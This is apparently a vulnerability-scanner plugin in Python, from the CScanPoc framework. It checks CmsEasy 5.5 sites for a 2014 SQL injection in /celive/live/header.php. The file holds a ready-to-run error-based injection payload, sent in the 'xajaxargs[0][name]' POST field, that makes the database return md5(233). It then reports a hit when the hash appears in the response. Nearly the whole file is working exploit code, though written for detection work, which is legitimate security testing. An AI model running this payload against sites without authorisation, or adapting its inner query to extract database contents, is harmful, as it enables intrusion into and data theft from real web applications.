# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'CmsEasy_0001_p'  # 平台漏洞编号，留空
    name = 'CmsEasy 5.5_UTF-8_20140802SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-08-03'  # 漏洞公布时间
    desc = '''
    CmsEasy 5.5 中 /celive/live/header.php 文件过滤不严存在POST注入
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=70827'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'CmsEasy'  # 漏洞应用名称
    product_version = 'CmsEasy 5.5'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'e58f3cc0-d241-4241-9b3d-26d628d8e5a7'
    author = 'cscan'  # POC编写者
    create_date = '2018-04-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            # CmsEasy存在post注入,此处测试的值是233的md5值
            post_data = {'xajax': 'LiveMessage',
                         'xajaxargs[0][name]': "1',(SELECT 1 FROM (select count(*),concat("
                         "floor(rand(0)*2),(select md5(233)))a from "
                         "information_schema.tables group by a)b),"
                         "'','','','1','127.0.0.1','2') #"}
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            request = requests.post(
                '{target}/celive/live/header.php'.format(target=self.target), data=post_data)
            r = request.text
            if 'e165421110ba03099a1c0393373c5b43' in r:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
